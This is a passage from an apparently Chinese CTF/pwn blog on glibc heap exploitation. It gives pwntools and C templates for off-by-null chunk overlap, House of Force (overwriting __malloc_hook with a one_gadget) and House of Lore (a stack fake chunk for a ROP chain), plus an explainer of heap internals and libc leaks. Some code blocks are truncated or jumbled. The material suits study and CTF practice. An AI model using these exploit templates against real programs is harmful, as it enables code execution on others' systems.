+# 初始化
+context.arch = &#39;amd64&#39;
+context.log_level = &#39;debug&#39;
+# io = process(&#39;./pwn_challenge&#39;)
+
+# --- 假设程序有标准的增删改查菜单 ---
+#这里根据实际程序里的逻辑替换
+def add(size, content=b&quot;a&quot;):
+    pass # 封装交互逻辑
+def delete(idx):
+    pass
+def edit(idx, content):
+    pass
+def show(idx):
+    pass
+
+def exploit():
+    # 1. 申请 A, B, C, D
+    # 大小选择 &gt; 0x80 以便进入 unsorted bin
+    add(0xf8) # idx 0: Chunk A
+    add(0xf8) # idx 1: Chunk B
+    add(0xf8) # idx 2: Chunk C
+    add(0x10) # idx 3: Chunk D (Gap)
+
+    # 2. 释放 A
+    delete(0)
+
+    # 3. 利用 B 的编辑功能，触发 Off-By-Null
+    # 假设 edit 会在末尾补 \x00，或者存在溢出
+    # 我们需要精算 prev_size，这里 A 的大小是 0x100，B 的大小也是 0x100
+    # 所以 C 前面的空闲块总大小应该是 0x200
+    prev_size = 0x200
+
+    # 构造 payload：填充 B 的数据区 -&gt; 写入 C 的 prev_size -&gt; 触发 \x00 覆盖 C 的 P 位
+    payload = b&#39;B&#39; * 0xf0
+    payload += p64(prev_size)
+
+    # 向 B 写入 payload 并触发溢出
+    edit(1, payload) 
+    log.info(&quot;Off-by-null triggered, C&#39;s PREV_INUSE cleared.&quot;)
+
+    # 4. 释放 C，触发堆叠重叠 (A+B+C 合并)
+    delete(2)
+    log.success(&quot;Chunks A, B, C successfully coalesced!&quot;)
+
+    # 5. 实现 Overlapping 利用
+    # 现在申请一个大 chunk，它将从原 A 的位置开始分配，一直覆盖到 B
+    # 我们可以通过写入这个新 chunk，直接篡改依然在使用中的 Chunk B 的数据或结构
+    add(0x1f8, b&#39;A&#39; * 0x100 + b&quot;HACKED_DATA&quot;) # idx 4
+
+    # 此时如果调用 show(1) 查看 B，就会输出 &quot;HACKED_DATA&quot;
+    # 或者如果进一步修改 B 的 fd 指针，就可以继续展开 Fastbin Attack 等
+
+    # io.interactive()
+
+if __name__ == &#39;__main__&#39;:
+    exploit()
+</code></pre>
+<p>高版本伪造跳过检查逻辑：</p>
+<p>在过去（比如 glibc 2.23），你只需要伪造头部和 <code>fd/bk</code>：</p>
+<pre><code class="language-plain">Fake_P:
+  [ prev_size ] = 0
+  [ size      ] = FAKE_SIZE
+  [ fd        ] = target_addr - 0x18
+  [ bk        ] = target_addr - 0x10
+</code></pre>
+<p>现在（高版本 glibc），你必须在内存布局上多布置一块数据：</p>
+<pre><code class="language-plain">Fake_P:
+  [ prev_size ] = 0
+  [ size      ] = FAKE_SIZE
+  [ fd        ] = target_addr - 0x18
+  [ bk        ] = target_addr - 0x10
+  ... (中间填充物) ...
+
+Fake_P + FAKE_SIZE:  prev_size
+    FAKE_SIZE,          # p-&gt;size
+    target_addr - 0x18, # p-&gt;fd  (绕过 unlink 双向链表检查)
+    target_addr - 0x10  # p-&gt;bk
+])
+
+# 2. 填充数据，直到达到 next_chunk 的 prev_size 位置
+# 减去头部 4 个 QWORD (0x20)
+payload = payload.ljust(FAKE_SIZE, b&#39;\x00&#39;) 
+
+# 3. 构造 Next Chunk 的 prev_size 和 size 
+payload += flat([
+    FAKE_SIZE,          # next_chunk(p)-&gt;prev_size (完美绕过新增的检查！)
+    0x21                # next_chunk(p)-&gt;size (给个合法大小，P位=1)
+])
+
+# 发送 payload 覆盖内存...
+</code></pre>
+<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>可以结合其它方法，任意地址读写</p>
+<p>任意地址分配</p>
+<h2 id="3-House-of-Force"><a href="#3-House-of-Force" class="headerlink" title="3.House of Force"></a>3.House of Force</h2><p>首先注意在glibc2.29以后，这个方法基本失效</p>
+<p>Force操作的是Top_chunk。 它利用无符号整数溢出的特性，强行将 Top Chunk 的指针移动到内存中的任意位置，从而实现任意地址分配。  </p>
+<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>有可分配任意大小的chunk</p>
+<p>需要泄露或已知地址(提前通过UAF来泄露base)</p>
+<h3 id="glibc的限制"><a href="#glibc的限制" class="headerlink" title="glibc的限制"></a>glibc的限制</h3><p>在2.29之后加了对top_chunk大小检查的逻辑，使Froce基本失效</p>
+<pre><code class="language-python">if (__glibc_unlikely (size &gt; av-&gt;system_mem))
+    malloc_printerr (&quot;malloc(): corrupted top size&quot;);
+</code></pre>
+<p>这样force就不能把top_chunk的size改成很大一块空间，然后去像改哪就改哪</p>
+<h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><p>申请A</p>
+<p>写A的时候溢出，把top_chunk的size改成很大的数</p>
+<p>然后分配很大的chunk到任意地址</p>
+<h3 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h3><p>任意地址分配，任意地址读写</p>
+<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><pre><code class="language-c">#include 
+#include 
+#include 
+#include 
+
+// 模拟我们的攻击目标，存放在 .bss 段
+char target_bss_var[0x20] = &quot;SAFE_DATA&quot;; 
+
+int main() &#123;
+    printf(&quot;[*] 初始 Target 变量内容: %s\n&quot;, target_bss_var);
+    printf(&quot;[*] Target 变量地址: %p\n&quot;, target_bss_var);
+
+    // 1. 分配一个靠近 Top Chunk 的堆块
+    intptr_t *ptr = malloc(0x10);
+    // 推算出当前 Top Chunk 的地址 (当前 chunk 首地址 + chunk 大小 0x20)
+    intptr_t top_chunk_addr = (intptr_t)ptr + 0x10; 
+    printf(&quot;[*] 当前 Top Chunk 地址推算为: 0x%lx\n&quot;, top_chunk_addr);
+
+    // 2. 模拟堆溢出漏洞，篡改 Top Chunk 的 size
+    printf(&quot;\n[*] 触发堆溢出，修改 Top Chunk Size 为 0xffffffffffffffff...\n&quot;);
+    intptr_t *top_chunk_size_ptr = (intptr_t *)(top_chunk_addr + 0x8);
+    *top_chunk_size_ptr = -1; // 强行覆盖 size
+
+    // 3. 计算跨越的偏移量 (offset)
+    // 公式: offset = target_addr - top_chunk_addr - 0x20
+    intptr_t target_addr = (intptr_t)&amp;target_bss_var;
+    intptr_t offset = target_addr - top_chunk_addr - 0x20;
+    printf(&quot;[*] 计算出的恶意偏移量 (offset): 0x%lx\n&quot;, offset);
+
+    // 4. The &quot;Force&quot; Malloc 跨越内存
+    printf(&quot;[*] 正在 malloc(offset) 强行移动 Top Chunk 指针...\n&quot;);
+    malloc(offset);
+
+    // 5. 再次分配，拿到目标地址
+    printf(&quot;\n[*] 再次 malloc(0x10)，分配器将返回目标地址...\n&quot;);
+    char *hacked_ptr = malloc(0x10);
+    printf(&quot;[+] Malloc 返回的指针: %p\n&quot;, hacked_ptr);
+
+    if (hacked_ptr == target_bss_var) &#123;
+        printf(&quot;[+] 成功接管 Target 地址！正在写入恶意数据...\n&quot;);
+        strcpy(hacked_ptr, &quot;HACKED_BY_FORCE!!&quot;);
+        printf(&quot;[!] 最终 Target 变量内容: %s\n&quot;, target_bss_var);
+    &#125; else &#123;
+        printf(&quot;[-] 劫持失败。返回的指针不匹配。\n&quot;);
+    &#125;
+
+    return 0;
+&#125;
+</code></pre>
+<p>exp</p>
+<pre><code class="language-python">from pwn import *
+
+context.arch = &#39;amd64&#39;
+context.log_level = &#39;debug&#39;
+
+# io = process(&#39;./pwn_challenge&#39;)
+# libc = ELF(&#39;./libc.so.6&#39;)
+
+def exploit():
+    # ==== 阶段 1：信息泄露 (假设已通过常规漏洞完成) ====
+    heap_base = 0x555555757000           # 泄露的堆基址
+    libc_base = 0x7ffff7a0d000           # 泄露的 libc 基址
+
+    # 计算 Top Chunk 的精确地址
+    # 假设我们之前一共申请了 0x30 大小的内存 (包含 header)
+    top_chunk_addr = heap_base + 0x30    
+
+    # 计算目标地址: __malloc_hook
+    # malloc_hook_addr = libc_base + libc.sym[&#39;__malloc_hook&#39;]
+    malloc_hook_addr = 0x7ffff7dd1b70    # 假设计算出的真实地址
+
+    # 准备后门地址或 one_gadget (这里以 one_gadget 为例)
+    one_gadget_addr = libc_base + 0x4f322
+
+    log.success(f&quot;Top Chunk Address: &#123;hex(top_chunk_addr)&#125;&quot;)
+    log.success(f&quot;__malloc_hook Address: &#123;hex(malloc_hook_addr)&#125;&quot;)
+
+    # ==== 阶段 2：触发溢出，篡改 Top Chunk Size ====
+    # 假设有一个 edit 函数存在堆溢出
+    # 向最后一个 chunk 写入数据，溢出覆盖相邻的 Top Chunk header
+    payload = b&#39;A&#39; * 0x18        # 填满当前 chunk 的数据区
+    payload += p64(0xffffffffffffffff) # 覆盖 Top Chunk 的 size 为 -1
+
+    # edit(idx, payload)
+    log.info(&quot;Top Chunk size overwritten with -1&quot;)
+
+    # ==== 阶段 3：计算并跨越内存 ====
+    # 公式: offset = target - top_chunk - 0x20
+    offset = malloc_hook_addr - top_chunk_addr - 0x20
+
+    # 因为是在 64 位无符号环境中，负数会自动转换为巨大的正数，可以直接传给 add()
+    # add(offset, b&quot;B&quot;) 
+    log.info(f&quot;Forced malloc with offset: &#123;hex(offset)&#125;&quot;)
+
+    # ==== 阶段 4：劫持控制流 ====
+    # 此时 Top Chunk 已经悬停在 __malloc_hook 上方
+    # 再次申请一个正常的 chunk，返回的地址就是 __malloc_hook
+    # 我们直接把 one_gadget 写入这个地址
+    # add(0x10, p64(one_gadget_addr))
+    log.success(&quot;__malloc_hook overwritten with one_gadget!&quot;)
+
+    # ==== 阶段 5：触发 Shell ====
+    # __malloc_hook 已经被篡改，此时程序中任何一次 malloc() 调用都会直接去执行 one_gadget
+    # add(0x10, b&quot;Trigger!&quot;) 
+
+    # io.interactive()
+
+if __name__ == &#39;__main__&#39;:
+    exploit()
+</code></pre>
+<h2 id="4-House-of-lore"><a href="#4-House-of-lore" class="headerlink" title="4.House of lore"></a>4.House of lore</h2><p>针对small_bin的经典攻击技术</p>
+<p> 篡改 Small Bin 链表中空闲堆块的 <code>bk</code>（后向指针），欺骗内存分配器，使其在后续的分配中，将我们伪造的非堆内存（如栈或 <code>.bss</code> 段）当作正常的 Small Bin Chunk 分配出来。  </p>
+<h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>UAF，堆溢出</p>
+<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>需要已知或泄露地址</p>
+<h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><p>1.这里glibc有一个检查</p>
+<pre><code class="language-python">bck = victim-&gt;bk;
+if (__builtin_expect (bck-&gt;fd != victim, 0))
+    malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);
+</code></pre>
+<p>2.glibc2.26以后引入了检查</p>
+<pre><code class="language-python">#if USE_TCACHE
+      /* While we&#39;re here, if we see other chunks of the same size,
+         stash them in the tcache.  */
+      size_t tc_idx = csize2tidx (nb);
+      if (tcache &amp;&amp; tc_idx counts[tc_idx] bk;
+              set_inuse_bit_at_offset (tc_victim, nb);
+              if (av != &amp;main_arena)
+            set_non_main_arena (tc_victim);
+              bin-&gt;bk = bck;
+              bck-&gt;fd = bin;
+
+              tcache_put (tc_victim, tc_idx);
+                &#125;
+        &#125;
+        &#125;
+#endif
+</code></pre>
+<p>我们需要 把 Tcache 塞满。这样当分配器来到 Small Bin 时，一看 Tcache 满了，就会直接跳过这段 stashing 代码。</p>
+<pre><code class="language-plain">tcache-&gt;counts[tc_idx] &gt;= mp_.tcache_count
+</code></pre>
+<h3 id="利用流程-1"><a href="#利用流程-1" class="headerlink" title="利用流程"></a>利用流程</h3><ol>
+<li>申请A,B,C。B要能进入small_bin</li>
+<li>释放B，申请更大的chunk_D</li>
+<li>写A,修改B的bk,指向有fake_chunk的地址</li>
+<li>布置X-&gt;fd &#x3D;&#x3D; &amp;B</li>
+<li>分配两次就可以取出fake_chunk</li>
+</ol>
+<h3 id="模板-1"><a href="#模板-1" class="headerlink" title="模板"></a>模板</h3><pre><code class="language-python">from pwn import *
+
+context.arch = &#39;amd64&#39;
+context.log_level = &#39;debug&#39;
+# io = process(&#39;./pwn_challenge&#39;)
+
+def exploit():
+    # 假设通过前面的步骤，已经泄露了 堆基址(heap_base) 和 栈地址(stack_leak)
+    victim_chunk_addr = heap_base + 0x10
+    
+    # 计算栈上伪造 chunk 的确切位置
+    fake_chunk_addr = stack_leak - 0x50 
+    fake_chunk_2_addr = fake_chunk_addr + 0x20 # 紧挨着放一个辅助 chunk
+    # ==========================================
+    # 1. 构造 Fake Chunk 数据 (需通过某种方式写入栈或 .bss)
+    # ==========================================
+    # 绕过 `bck-&gt;fd == victim` 检查
+    payload = flat([
+        0, 0,                  # prev_size, size
+        victim_chunk_addr,     # fd = victim chunk head
+        fake_chunk_2_addr,     # bk = fake_chunk_2
+        # --- fake_chunk_2 ---
+        0, 0,                  # prev_size, size
+        fake_chunk_addr,       # fd = fake_chunk
+        0                      # bk = 0
+    ])
+    # 假设通过栈溢出或任意写布置了上述 payload
+    # io.sendafter(&quot;Enter stack data: &quot;, payload)
+
+    # ==========================================
+    # 2. 制造 Small Bin 并触发漏洞
+    # ==========================================
+    # add(0x100) # idx 0: Victim
+    # add(0x10)  # idx 1: Gap
+    # delete(0)  # 进入 Unsorted Bin
+    # add(0x120) # idx 2: 触发整理，Victim 掉入 Small Bin
+
+    # 利用 UAF 或 Heap Overflow 修改 idx 0 的 bk
+    # fd 保持原样 (填 0 或填真实的 bin 地址)，bk 修改为 fake_chunk_addr
+    # edit(0, p64(0) + p64(fake_chunk_addr)) 
+
+    # ==========================================
+    # 3. 连续分配，劫持目标
+    # ==========================================
+    # 第一次 malloc 拿出原始的 victim
+    # add(0x100) # idx 3
+    
+    # 第二次 malloc 拿到栈上的 fake chunk！
+    # 写入 ROP 链覆盖返回地址
+    # add(0x100, rop_chain_payload) # idx 4
+
+    log.success(&quot;Control flow hijacked via House of Lore!&quot;)
+    # io.interactive()
+
+if __name__ == &#39;__main__&#39;:
+    exploit()
+</code></pre>
+<p>实际如果用fastbin和tcachebin比这个方便。因为不用管双向链表</p>
+<h2 id="5-House-of-Orange"><a href="#5-House-of-Orange" class="headerlink" title="5.House of Orange"></a>5.House of Orange</h2>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #ffa2c4">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/heap/" style="color: #00a596">heap</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/house-of-spirit/" style="color: #ffa2c4">house-of-spirit</a>
+        </span>
+        
+    </div>
+    <a href="/2025/07/01/House%20of/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/06/25/%E5%A0%86%E5%88%A9%E7%94%A8%EF%BC%88%E7%9A%84%E6%A6%82%E5%BF%B5%EF%BC%89/">
+        <h2 class="post-title">堆利用基本概念</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/6/25
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="堆的基本概念"><a href="#堆的基本概念" class="headerlink" title="堆的基本概念"></a>堆的基本概念</h1><p>elf中的一个段</p>
+<p>一个内存区，动态的。需要的时候可以申请。不想要的时候可以还回去</p>
+<p>在heap段申请</p>
+<p>堆是全局变量</p>
+<p>e.g.</p>
+<p>char *buffer &#x3D; (char *)malloc(10);</p>
+<p>free(buffer);</p>
+<p>heap从低向高，申请的时候这个brk会向上移。（这个主要是因为main_arena要管理堆空间，这也是它的手段。）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530633916-393f11bf-9105-4187-aa0c-5fc5ae345e4f.png"></p>
+<p>只有主线程的main_arena 能访问heap段和mmap区域</p>
+<h1 id="main-arena-管理者。主要竞技场"><a href="#main-arena-管理者。主要竞技场" class="headerlink" title="main_arena(管理者。主要竞技场)"></a>main_arena(管理者。主要竞技场)</h1><h3 id="它是："><a href="#它是：" class="headerlink" title="它是："></a>它是：</h3><p>对应了程序启动后通过 <code>sbrk()</code> 获得的第一块堆空间。<code>main_arena</code> 属于一个 <code>malloc_state</code> 类型的结构体，包含了一系列与堆管理相关的元数据和多个双向链表。</p>
+<h3 id="功能："><a href="#功能：" class="headerlink" title="功能："></a>功能：</h3><p>（1）</p>
+<p>用于存放不同大小的空闲块（fastbins、small bins、large bins 等）</p>
+<p>以及记录当前顶端 chunk、最近剩余（last_remainder）等信息</p>
+<p>（2）</p>
+<p>维护初始分配空闲，多线程下当第一个 arena，</p>
+<p>后续各线程如果需要更多的并发性能，会新建【线程 arena（thread arena）】</p>
+<h1 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h1><p>malloc通过main_arena分配一小块内存。如果不够可以通过brk扩张。空闲的空间太多它也可以缩小</p>
+<p>non_main_arena只有132kb可以读写的</p>
+<p>heap_info:每个堆的头部，main_arena没有</p>
+<p>（2）malloc_state:arena的头部，这个是全局变量不是堆</p>
+<p>malloc_chunk:每个chunk头部</p>
+<p>ptmalloc：是堆管理器</p>
+<p><strong>最小申请的<strong><strong>堆内存</strong></strong>大小</strong></p>
+<p>用户最小申请的内存大小必须是 2 * SIZE_SZ 的最小整数倍。</p>
+<h1 id="堆的简单申请"><a href="#堆的简单申请" class="headerlink" title="堆的简单申请"></a>堆的简单申请</h1><p>堆可以通过 malloc 或者 mmap 向系统内核空间申请堆空间。</p>
+<p>一般大小的堆的申请，使用malloc,大于128K的申请，使用 mmap。</p>
+<p>这些可以通过配置项修改</p>
+<h1 id="chunk宏"><a href="#chunk宏" class="headerlink" title="chunk宏"></a>chunk宏</h1><h2 id="prev-size"><a href="#prev-size" class="headerlink" title="prev_size"></a><strong>prev_size</strong></h2><p> 如果该 chunk 的 物理相邻的前一地址 chunk 是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。 (较低地址的 chunk )</p>
+<h2 id="size"><a href="#size" class="headerlink" title="size"></a><strong>size</strong></h2><p>这个的大小必须是 MALLOC_ALIGNMENT 的整数倍。</p>
+<p>  如果申请的内存大小不是 MALLOC_ALIGNMENT 的整数倍，会被转换满足大小的最小的 MALLOC_ALIGNMENT 的倍数。</p>
+<p>  这通过 request2size() 宏完成。</p>
+<p>  32 位系统中， MALLOC_ALIGNMENT 可能是 4或 8 ；64 位系统中，MALLOC_ALIGNMENT 是 8。 低三位对chunk大小没有影响</p>
+<h2 id="non-main-arena"><a href="#non-main-arena" class="headerlink" title="non_main_arena"></a>non_main_arena</h2><p>记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</p>
+<h3 id="is-mapped"><a href="#is-mapped" class="headerlink" title="is_mapped"></a>is_mapped</h3><p>记录当前 chunk 是否是由 mmap 分配的。</p>
+<h3 id="prev-inuse"><a href="#prev-inuse" class="headerlink" title="prev_inuse"></a>prev_inuse</h3><p>记录前一个 chunk 块是否被分配。堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，防止访问前面的非法内存。 P 位为 0 时，我们能通过 prev_inuse字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p>
+<h2 id="fd-和bk"><a href="#fd-和bk" class="headerlink" title="fd****和bk"></a><strong>fd****和bk</strong></h2><p>   chunk 处于分配状态时，从 fd 字段开始是用户的数据。 </p>
+<p>  fd 和bk 分别指向下一个和上一个（不是物理相邻）空闲的 chunk 。</p>
+<p>  通过 fd 和 bk 可以把空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理。</p>
+<p>   申请返回的指针，指向的 user data</p>
+<h2 id="fd-nextsize，-bk-nextsize，"><a href="#fd-nextsize，-bk-nextsize，" class="headerlink" title="fd_nextsize， bk_nextsize，"></a><strong>fd_nextsize， bk_nextsize</strong>，</h2><p>   只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。</p>
+<p>   fd_nextsize 和bk_nextsize 分别指向前一个和后一个与当前 chunk 大小不同的第一个空闲块，并且不包含 bin 的头指针。</p>
+<p>   一般空闲的 large chunk 在 fd 的遍历顺序中，由大到小排列。避免在寻找合适 chunk 时挨个遍历。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530634739-bad24147-c482-4c0f-8b91-8394fbc2d2f2.png"></p>
+<h2 id="简单的，一个泄露方法"><a href="#简单的，一个泄露方法" class="headerlink" title="简单的，一个泄露方法"></a>简单的，一个泄露方法</h2><p>这个（2）在libc地址里如果知道了malloc_state的地址就可以泄露出libc的地址</p>
+<h2 id="Allocated-Chunk（已分配的）"><a href="#Allocated-Chunk（已分配的）" class="headerlink" title="Allocated Chunk（已分配的）"></a>Allocated Chunk（已分配的）</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530634474-52dd1e34-a9e6-445f-b425-ac5460f6310c.png"></p>
+<p>32位为4B，64位为8B。</p>
+<p>填充了用户的数据以后，它再溢出就可以溢出到pre chunk的下面。再到低位。</p>
+<p>已分配的chunk区域是Usr data一块。但是真正认为是从if(最上面开始的)</p>
+<h2 id="chunk和mem的转换"><a href="#chunk和mem的转换" class="headerlink" title="chunk和mem的转换"></a>chunk和mem的转换</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530634203-176958aa-bafe-4036-abf2-729083aedf4e.png"></p>
+<p>申请内存时，由于字节对齐。可能申请的不一定等于可用的</p>
+<p>64位16字节对齐。只申请一个8字节的chunk。它就会给你补上剩下的8字节。</p>
+<p>申请了8字节却得到了16字节</p>
+<p>malloc_usable_size函数来获得可用内存大小</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530634179-cbbde016-1fee-4cf9-9262-ba81163d54ca.png"></p>
+<h2 id="Free-chunk"><a href="#Free-chunk" class="headerlink" title="Free chunk"></a>Free chunk</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530635216-c99d09ce-32a4-4414-9e0e-560154ac7c25.png"></p>
+<p>fd(forwrod)和bk(back)在free chunk处于large bins才会生效。</p>
+<p>如果上个chunk也是free的它就会和上一个合并。合并成一个新的free chunk.直到它上面是一个已经分配的chunk.</p>
+<h1 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h1><p>在arena顶部的chunk叫做top chunk.不属于任何bin.bin没有空闲的chunk时。切割top chunk来满足申请</p>
+<h2 id="e-g"><a href="#e-g" class="headerlink" title="e.g."></a>e.g.</h2><p>Top chunk（N字节）</p>
+<p>申请了（K字节）</p>
+<h3 id="1-如果top-chunk够用"><a href="#1-如果top-chunk够用" class="headerlink" title="1.如果top chunk够用"></a>1.如果top chunk够用</h3><p>top chunk切割为K（分配给用户）</p>
+<p>和N-K字节（叫做Last Remember chunk）两部分。</p>
+<h3 id="2-top-chunk不够用"><a href="#2-top-chunk不够用" class="headerlink" title="2.top chunk不够用"></a>2.top chunk不够用</h3><p>(1)在main_arena中用brk()扩张top chunk</p>
+<p>(2)在non_main_arena中，用mmap()分配新的chunk</p>
+<p>top chunk的PREV_INUSE位(就是我们在gdb里可以拿x32&#x2F;x看到的heap的最后一位。如果是1.表示,前一个 chunk 已经在用（in use）。)</p>
+<p>总是1</p>
+<h1 id="Last-Remainder-chunk"><a href="#Last-Remainder-chunk" class="headerlink" title="Last Remainder chunk"></a>Last Remainder chunk</h1><p>（1）chunk的small bin里没有满足分配的小字节k的要求的。</p>
+<p>（2）并且这个时候last remainder chunk能满足要求。</p>
+<p>这个时候就会：</p>
+<p>K字节的chunk分配给用户</p>
+<p>N-K的chunk成为新的last remainder chunk</p>
+<p>作用就是使得连续的小空间申请时分配到的内存都相邻。就不破坏堆的存储结构。</p>
+<h1 id="Bin的结构（free-list-malloc-state-heap-list结构）"><a href="#Bin的结构（free-list-malloc-state-heap-list结构）" class="headerlink" title="Bin的结构（free list&#x2F;malloc_state&#x2F;heap_list结构）"></a>Bin的结构（free list&#x2F;malloc_state&#x2F;heap_list结构）</h1><h1 id="（链表桶）"><a href="#（链表桶）" class="headerlink" title="（链表桶）"></a>（链表桶）</h1><p>bin实现了空闲链表。用来存储空闲的chunk。有下面几种类型：</p>
+<p>1.10个fast bins ,存储在fastbinsY中</p>
+<p>2.1个unsorted bin,存储在bin[1]中</p>
+<p>3.62个small bins,存储在bin[2]到bin[63]</p>
+<p>4.63个large bins,存储在bin[64]到bin[126]中</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530635277-ba8d628e-e851-477d-a471-1e7887236ed4.png"></p>
+<h2 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h2><p>当把chunk free到fast bin中时。它的下一个chunk的PREV_INUSE（IN_USE位）是不会变的。(还是1)</p>
+<p>它不会被合并。不会被认为是空闲的。但是实际上它已经进入了fast bin 已经空闲了。这是一种欺骗性的做法</p>
+<p>为什么要这么做</p>
+<p>1.反复申请再free这样free的效率就会变低。一直让它保持这个状态好申请</p>
+<p>2.malloc申请小chunk时用完free时。它并不会合并成一个。它还是两个小的</p>
+<h3 id="fast-bin的介绍"><a href="#fast-bin的介绍" class="headerlink" title="fast bin的介绍"></a>fast bin的介绍</h3><p>像高速缓存cache。提高小内存分配效率。速度变快的代价是内存变小。</p>
+<p>相邻chunk 不会合并。导致chunk碎片化。但是free效率提高</p>
+<p>它是10个LIFO（跟栈一样）的单链表。最后三个链表保留不用</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530635159-d9a8f5cb-a3bb-49ab-bbca-35451aa39339.png"></p>
+<h3 id="Fast-bin的最大大小"><a href="#Fast-bin的最大大小" class="headerlink" title="Fast bin的最大大小"></a>Fast bin的最大大小</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530635329-cbb27467-13d8-4e8f-95eb-04533b412a67.png"></p>
+<p>它会被赋给global_max_fast</p>
+<p>申请时是first fit原则。</p>
+<p>释放fast chunk </p>
+<p>1.检查它的大小以及此时fast bin里chunk是否合法</p>
+<p>2.插入fastbin的链表头。此时fd指向old（指向chunk指针）</p>
+<p>通常，它的大小一般在0x01到0x80之间</p>
+<h2 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h2><p>缓冲区buffer 。大小超过fast bin的chunk释放后会到这</p>
+<p>使ptmalloc2可以复用使用过的chunk。又提升效率了 </p>
+<p>双向循环链表。unsorted bin的设计用途是临时存储刚释放的堆块，并在后续分配时进行分类（small&#x2F;large bin），最终将它们的地址用于分配或合并。</p>
+<p>chunk大小大于global_max_fast</p>
+<p>当一个堆块被释放到<strong>unsorted bin</strong>时，该堆块的<code>fd</code>和<code>bk</code>指针会被初始化为指向<code>main_arena</code>中的<code>unsorted_bins</code>链表头。</p>
+<p>这种机制使得如果攻击者能够<strong>读取已释放堆块的元数据</strong>（如通过use-after-free或堆溢出），即可从<code>fd</code>或<code>bk</code>指针中 leaks 出<code>main_arena</code>的地址。由于<code>main_arena</code>在libc中的偏移是固定的，攻击者可以通过泄露的地址计算出libc的基地址，从而绕过ASLR保护。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530635748-2d62f22e-a18f-4c9f-9234-27f2ed01da84.png"></p>
+<p>如果在unsorted中找chunk没有找到。就要去top chunk里面切割了</p>
+<h2 id="Small-bins"><a href="#Small-bins" class="headerlink" title="Small bins"></a>Small bins</h2><p>小于0x200(0x400)B的chunk叫做small chunk</p>
+<p>Small chunk肯定就只能存放这些小chunk.</p>
+<p>chunk大小就是从16B开始每次加8B</p>
+<p>chunk大小0x10-0x1f0B(0x20-0x3f0),相邻bin存放的大小相差0x8(0x10)B</p>
+<p>0x200是实际的大小。0x1f0B是用户申请到的</p>
+<h4 id="释放fast-chunk"><a href="#释放fast-chunk" class="headerlink" title="释放fast chunk"></a>释放fast chunk</h4><p>1.前一个空闲，就合并。触发前一个相邻chunk的unlink</p>
+<p>2.下一个chunk 是top chunk。则合并结束。不是的话继续3</p>
+<p>3.下一个chunk空闲。就合并。触发下一个chunk的unlink.否则就设置下一个相邻的PREV_INUSE为0</p>
+<p>4.将现在的chunk插入unstorted bin</p>
+<p>5.如果size 超过了FASTBIN_CONSOLIDATION_THRESHOLD.尽可能合并fastbin中chunk。放到unsortedbin里面</p>
+<p>如果top chunk大小超过了mp_.trim_threshoid。给os归还内存</p>
+<h3 id="Small-bin的介绍"><a href="#Small-bin的介绍" class="headerlink" title="Small bin的介绍"></a>Small bin的介绍</h3><p>62个双向循环链表。FIFO。相邻的空闲chunk会被合并</p>
+<h2 id="Large-bins"><a href="#Large-bins" class="headerlink" title="Large bins"></a>Large bins</h2><p>大于等于0x200（0x400）B的chunk1叫large chunk</p>
+<p>63个双向循环链表。插入和删除不一定要从头开始。可以发生在任意位置。相邻空闲chunk会被合并</p>
+<h3 id="chunk的大小"><a href="#chunk的大小" class="headerlink" title="chunk的大小"></a>chunk的大小</h3><p>前32个：从0x200B开始。每次+0x40B</p>
+<p>接下来16个：每次+0x200B</p>
+<p>接下来8个：每次+0x1000B</p>
+<p>接下来4个：每次+0x8000B</p>
+<p>接下来2个：每次+0x40000B</p>
